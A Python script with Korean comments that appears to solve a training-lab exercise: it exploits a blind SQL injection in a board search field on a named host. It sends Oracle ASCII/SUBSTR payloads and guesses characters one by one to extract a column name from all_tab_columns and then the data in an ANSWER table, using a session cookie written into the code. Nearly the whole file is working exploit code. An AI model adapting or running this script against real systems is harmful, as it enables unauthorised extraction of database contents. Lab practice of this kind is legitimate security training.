import requests

url = 'http://elms1.skinfosec.co.kr:8082/community6/free'
# Cookie 값은 로그인 후 변경 필요
cookie = {'JSESSIONID': '60E02AE5E354BA3367831F9B51C8908F'}

# 문제 : 게시글 검색창에서 블라인드 인젝션이 발생한다. 해당 구간에서 ANSWER 테이블의 데이터에서 정답을 찾으시오. (DB명은 INF6, 테이블명 ANSWER)
# 공격 벡터 탐색 : Keyword
# 쿼리문 탐색
# 1. aaa' AND '%1%'='%1
# aaa' AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE TABLE_NAME='ANSWER') WHERE RNUM = 1),1,1)) < 130 AND '%1%'='%1

def find_column_name():

    find_column = ""


    for i in range(10):
        
        for ascii in range(48, 122):
            param = {"startDt": "", "endDt": "", "searchType": "all", "keyword": "aaa' AND ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE TABLE_NAME='ANSWER') WHERE RNUM = 1),{},1)) = {} AND '%1%'='%1".format(i+1, ascii)}
            # GET방식으로 전송하므로 requests.get로 전달해야 한다.
            Send = requests.get(url, params = param, cookies = cookie)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("column의 값은: ",chr(ascii))
                find_column += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
    print("column의 이름은:", find_column, "입니다.")
    return find_column
    
def find_data_name():
    
 column_name = find_column_name()
 find_data_name = ""
    
 for j in range(10):
  for ascii in range(48, 122):
            param = {"startDt": "", "endDt": "", "searchType": "all", "keyword": "aaa' AND ASCII(SUBSTR((SELECT {} FROM (SELECT ROWNUM AS RNUM, {} FROM ANSWER) WHERE RNUM = 1),{},1)) = {} AND '%1%'='%1".format(column_name,column_name, j+1, ascii)}
            # GET방식으로 전송하므로 requests.get로 전달해야 한다.
            Send = requests.get(url, params = param, cookies = cookie)
            if "AAAAAAAAAAAAAAAAAAAAAAAAAAA" in Send.text:
                print("data의 값은: ",chr(ascii))
                find_data_name += chr(ascii)
                break
            print("값을 찾고있습니다!",chr(ascii))
 print("data의 이름은:", find_data_name, "입니다.")
    

    
find_data_name()


